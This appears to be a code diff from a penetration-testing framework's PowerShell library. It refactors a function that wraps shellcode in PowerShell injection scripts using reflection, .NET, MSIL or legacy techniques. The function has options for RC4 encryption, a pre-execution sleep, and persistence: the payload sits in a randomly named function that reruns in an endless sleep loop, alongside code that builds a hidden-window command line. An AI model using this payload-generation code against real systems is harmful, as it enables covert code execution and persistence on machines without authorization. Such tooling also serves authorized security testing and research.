@@ -258,6 +258,56 @@ EOS
   end
 
   #
+  # Wraps the payload in a powershell script for injection
+  #
+  # @param pay [String] The payload shellcode
+  # @param opts [Hash] The options to generate the command
+  # @option opts [String] :method The powershell injection technique to
+  #   use: 'net'/'reflection'/'old'/'msil'
+  # @option opts [Boolean] :exec_rc4 Encrypt the payload with RC4
+  # @option opts [Boolean] :persist Loop the payload to cause
+  #   re-execution if the shellcode finishes
+  # @option opts [String] :prepend_inner A stub of Powershell code to prepend to
+  #  the inner payload.
+  # @option opts [Integer] :prepend_sleep Sleep for the specified time
+  #   before executing the payload
+  #
+  def self.psh_payload(pay, template_path, opts = {})
+    win32pe_payload = case opts[:method]
+      when 'net'
+        Rex::Powershell::Payload.to_win32pe_psh_net(template_path, pay)
+      when 'reflection'
+        Rex::Powershell::Payload.to_win32pe_psh_reflection(template_path, pay)
+      when 'old'
+        Rex::Powershell::Payload.to_win32pe_psh(template_path, pay)
+      when 'msil'
+        Rex::Powershell::Payload.to_win32pe_psh_msil(template_path, pay)
+      else
+        fail RuntimeError, 'No Powershell method specified'
+    end
+
+    win32pe_payload = Rex::Powershell::Payload.to_win32pe_psh_rc4(template_path, win32pe_payload) if opts[:exec_rc4]
+
+    if opts[:prepend_inner]
+      win32pe_payload = opts[:prepend_inner] << (opts[:prepend_inner].end_with?(';') ? '' : ';') << win32pe_payload
+    end
+
+    # Run our payload in a while loop
+    if opts[:persist]
+      fun_name = Rex::Text.rand_text_alpha(rand(2..3))
+      sleep_time = rand(5..9)
+      win32pe_payload = "function #{fun_name}{#{win32pe_payload}};"
+      win32pe_payload << "while(1){Start-Sleep -s #{sleep_time};#{fun_name};1};"
+    end
+
+    if opts[:prepend_sleep]
+      win32pe_payload = "Start-Sleep -s #{opts[:prepend_sleep]};" << win32pe_payload if opts[:prepend_sleep].to_i > 0
+    end
+
+    win32pe_payload
+  end
+
+  #
   # Creates a powershell command line string which will execute the
   # payload in a hidden window in the appropriate execution environment
   # for the payload architecture. Opts are passed through to
@@ -277,11 +327,12 @@ EOS
   # @option opts [Integer] :prepend_sleep Sleep for the specified time
   #   before executing the payload
   # @option opts [String] :method The powershell injection technique to
-  #   use: 'net'/'reflection'/'old'
+  #   use: 'net'/'reflection'/'old'/'msil'
   # @option opts [Boolean] :encode_inner_payload Encodes the powershell
   #   script within the hidden/architecture detection wrapper
   # @option opts [Boolean] :encode_final_payload Encodes the final
   #   powershell script
+  # @option opts [Boolean] :exec_rc4 Encrypt the payload with RC4
   # @option opts [Boolean] :remove_comspec Removes the %COMSPEC%
   #   environment variable at the start of the command line
   # @option opts [Boolean] :wrap_double_quotes Wraps the -Command
@@ -300,43 +351,10 @@ EOS
       fail Exceptions::PowershellError, ':no_equals requires :encode_final_payload option to be used'
     end
 
-    psh_payload = case opts[:method]
-      when 'net'
-        Rex::Powershell::Payload.to_win32pe_psh_net(template_path, pay)
-      when 'reflection'
-        Rex::Powershell::Payload.to_win32pe_psh_reflection(template_path, pay)
-      when 'old'
-        Rex::Powershell::Payload.to_win32pe_psh(template_path, pay)
-      when 'msil'
-        Rex::Powershell::Payload.to_win32pe_psh_msil(template_path, pay)
-      else
-        fail Exceptions::PowershellError, 'No Powershell method specified'
-    end
+    win32pe_payload = psh_payload(pay, template_path, opts)
 
-    if opts[:exec_rc4]
-      psh_payload = Rex::Powershell::Payload.to_win32pe_psh_rc4(template_path, psh_payload)
-    end
-
-    if opts[:prepend_inner]
-      psh_payload = opts[:prepend_inner] << (opts[:prepend_inner].end_with?(';') ? '' : ';') << psh_payload
-    end
-
-    # Run our payload in a while loop
-    if opts[:persist]
-      fun_name = Rex::Text.rand_text_alpha(rand(2) + 2)
-      sleep_time = rand(5) + 5
-      psh_payload  = "function #{fun_name}{#{psh_payload}};"
-      psh_payload << "while(1){Start-Sleep -s #{sleep_time};#{fun_name};1};"
-    end
-
-    if opts[:prepend_sleep]
-      if opts[:prepend_sleep].to_i > 0
-        psh_payload = "Start-Sleep -s #{opts[:prepend_sleep]};" << psh_payload
-      end
-    end
-
-    compressed_payload = compress_script(psh_payload, nil, opts)
-    encoded_payload = encode_script(psh_payload, opts)
+    compressed_payload = compress_script(win32pe_payload, nil, opts)
+    encoded_payload = encode_script(win32pe_payload, opts)
 
     # This branch is probably never taken...
     if encoded_payload.length <= compressed_payload.length
